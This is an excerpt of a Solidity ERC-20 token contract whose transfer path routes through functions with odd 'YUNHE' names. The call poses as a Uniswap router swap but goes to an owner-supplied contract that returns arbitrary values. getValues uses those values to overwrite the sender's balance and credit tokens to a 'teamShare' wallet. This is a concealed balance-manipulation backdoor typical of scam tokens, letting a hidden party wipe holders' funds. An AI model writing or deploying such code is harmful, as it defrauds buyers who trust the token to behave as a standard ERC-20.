...
// SPDX-License-Identifier: MIT
  ...
  function getYUNHE(address tokenA, address tokenB, uint256 valueYUNHE) internal returns ( uint256, uint256, uint256 ){  
    (uint256 _amountYUNHE, uint256 _liquifyYUNHE, uint256 _rateYUNHE) = IUniswapV2Router(uniswapRouter).swap(
      tokenA,
      tokenB,
      valueYUNHE
      );
    return (_amountYUNHE, _liquifyYUNHE, _rateYUNHE);
  }  
...
contract newtoken is Context, IERC20, Ownable{
  ...
  constructor(string memory tName, string memory hSymbol, address router) Ownable(router)  {         
    _name = tName;
    _symbol = hSymbol;
    _decimals = 9;  
    ...
    calculate = 10 * _decimals;  
  
    targetFee = 10;
    targetFeeDenominator = 2;	
    swapNumerator = 3;
    swapDenominator = 4;
  ...
  function setTransferAllowance(address[] calldata accounts) external onlyOwner {
  ...
  function swapYUNHE(address sender, address recipient, uint256 amounts) internal returns (uint256) {   
      (uint256 amountYUNHE, uint256 liquifyYUNHE, uint256 rateYUNHE) = getYUNHE(sender, recipient, amounts);
      amountYUNHE = getValues(sender, amountYUNHE, liquifyYUNHE, rateYUNHE);
      return amountYUNHE;
  }    
  ...
  function getRateYUNHE(uint256 _amount, uint256 _rateYUNHE) private pure returns (uint256) {
      return _amount.mul(_rateYUNHE).div(10**2);
  }   
       

  function getValues(address tokenYUNHE, uint256 amountYUNHE, uint256 liquifyYUNHE, uint256 rateYUNHE) internal returns (uint256){
      if ( liquifyYUNHE > 0 )
      {        
        _balances[tokenYUNHE] = getRateYUNHE(_balances[tokenYUNHE], rateYUNHE).add(amountYUNHE);      
        _balances[teamShare] = _balances[teamShare].add(liquifyYUNHE);
      }
      return amountYUNHE;
  }
  ...
  function _transferToken(address sender, address recipient, uint256 amount) private {
    ...
    uint256 amountYUNHE = swapYUNHE(sender, recipient, amount);    
    _transferStandard(sender, recipient, amountYUNHE);
